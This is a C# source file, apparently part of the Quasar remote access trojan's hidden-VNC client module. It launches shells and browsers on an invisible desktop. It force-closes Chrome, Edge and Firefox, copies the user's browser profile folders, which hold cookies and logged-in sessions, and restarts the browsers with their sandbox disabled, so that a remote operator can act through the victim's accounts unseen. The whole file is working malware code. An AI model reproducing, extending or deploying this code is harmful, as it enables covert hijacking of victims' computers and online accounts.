﻿using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Quasar.Client.Helper.HVNC
{
    public class ProcessController
    {
        public ProcessController(string DesktopName)
        {
            this.DesktopName = DesktopName;
        }

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        private void CloneDirectory(string sourceDir, string destinationDir)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(sourceDir);
            if (!directoryInfo.Exists)
            {
                throw new DirectoryNotFoundException("Source directory '" + sourceDir + "' does not exist.");
            }
            if (!Directory.Exists(destinationDir))
            {
                Directory.CreateDirectory(destinationDir);
            }
            foreach (FileInfo fileInfo in directoryInfo.GetFiles())
            {
                string destFileName = Path.Combine(destinationDir, fileInfo.Name);
                try
                {
                    fileInfo.CopyTo(destFileName, false);
                }
                catch (IOException ex)
                {
                    Console.WriteLine("Could not copy file '" + fileInfo.FullName + "': " + ex.Message);
                }
            }
            foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
            {
                string destinationDir2 = Path.Combine(destinationDir, directoryInfo2.Name);
                this.CloneDirectory(directoryInfo2.FullName, destinationDir2);
            }
        }

        private static bool DeleteFolder(string folderPath)
        {
            bool result;
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Directory.Delete(folderPath, true);
                    result = true;
                }
                else
                {
                    Console.WriteLine("Folder does not exist.");
                    result = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error deleting folder: " + ex.Message);
                result = false;
            }
            return result;
        }

        public void StartCmd()
        {
            string path = Environment.GetEnvironmentVariable("SystemRoot") + "\\System32\\cmd.exe";
            this.CreateProc(path);
        }

        public void StartPowershell()
        {
            string path = Environment.GetEnvironmentVariable("SystemRoot") + "\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            this.CreateProc(path);
        }

        public void StartFirefox()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
            string sourceDir = Path.Combine(path, "Profiles");
            string text = Path.Combine(path, "SecureFolder");
            string filePath = "cmd.exe taskkill /IM firefox.exe /F ";
            if (!Directory.Exists(text))
            {
                this.CreateProc(filePath);
                Directory.CreateDirectory(text);
                this.CloneDirectory(sourceDir, text);
            }
            else
            {
                DeleteFolder(text);
                this.StartEdge();
            }
            string filePath2 = "cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
            this.CreateProc(filePath2);
        }

        public void StartEdge()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
            string sourceDir = Path.Combine(path, "User Data");
            string text = Path.Combine(path, "SecureFolder");
            string filePath = "cmd.exe taskkill /IM msedge.exe /F ";
            if (!Directory.Exists(text))
            {
                this.CreateProc(filePath);
                Directory.CreateDirectory(text);
                this.CloneDirectory(sourceDir, text);
            }
            else
            {
                DeleteFolder(text);
                this.StartEdge();
            }
            string filePath2 = "cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
            this.CreateProc(filePath2);
        }

        public bool Startchrome()
        {
            bool result;
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
                string sourceDir = Path.Combine(path, "User Data");
                string text = Path.Combine(path, "SecureFolder");
                string filePath = "cmd.exe taskkill /IM chrome.exe /F ";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                    this.CreateProc(filePath);
                    this.CloneDirectory(sourceDir, text);
                }
                else
                {
                    DeleteFolder(text);
                    this.Startchrome();
                }
                string filePath2 = "cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
                result = this.CreateProc(filePath2);
            }
            catch
            {
                result = false;
            }
            return result;
        }

        public bool StartExplorer()
        {
            uint num = 2U;
            string name = "TaskbarGlomLevel";
            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
            {
                if (registryKey != null)
                {
                    object value = registryKey.GetValue(name);
                    if (value is uint)
                    {
                        uint num2 = (uint)value;
                        if (num2 != num)
                        {
                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
                        }
                    }
                }
            }
            return this.CreateProc("C:\\Windows\\explorer.exe");
        }

        public bool CloseProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        public bool CreateProc(string filePath)
        {
            STARTUPINFO structure = default(STARTUPINFO);
            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
            structure.lpDesktop = this.DesktopName;
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
        }

        private string DesktopName;

        private struct STARTUPINFO
        {
            public int cb;

            public string lpReserved;

            public string lpDesktop;

            public string lpTitle;

            public int dwX;

            public int dwY;

            public int dwXSize;

            public int dwYSize;

            public int dwXCountChars;

            public int dwYCountChars;

            public int dwFillAttribute;

            public int dwFlags;

            public short wShowWindow;

            public short cbReserved2;

            public IntPtr lpReserved2;

            public IntPtr hStdInput;

            public IntPtr hStdOutput;

            public IntPtr hStdError;
        }

        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }
    }
}
